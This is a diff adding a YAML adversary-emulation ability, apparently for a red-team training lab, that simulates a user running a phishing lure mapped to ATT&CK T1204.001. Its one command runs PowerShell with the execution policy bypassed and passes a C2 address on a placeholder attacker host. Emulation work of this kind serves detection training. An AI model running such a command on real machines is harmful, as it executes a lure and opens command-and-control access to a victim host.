@@ -1,0 +1,16 @@
+---
+
+- id: 4a100012-cafe-4001-8001-c0ffee000012
+  name: Phishing payload execution on victim host (L8 Sc.1 step 2)
+  description: Simulate a user clicking the phishing link — drops and runs the phishing lure payload to produce endpoint artefacts visible at network and host layer
+  tactic: execution
+  technique:
+    attack_id: T1204.001
+    name: "User Execution: Malicious Link"
+  platforms:
+    windows:
+      psh:
+        command: |
+          powershell.exe -NoP -ExecutionPolicy Bypass -File .\phishing_lure.ps1 -C2Uri "http://#{attacker.host.ip}:8080"
+        payloads:
+          - phishing_lure.ps1
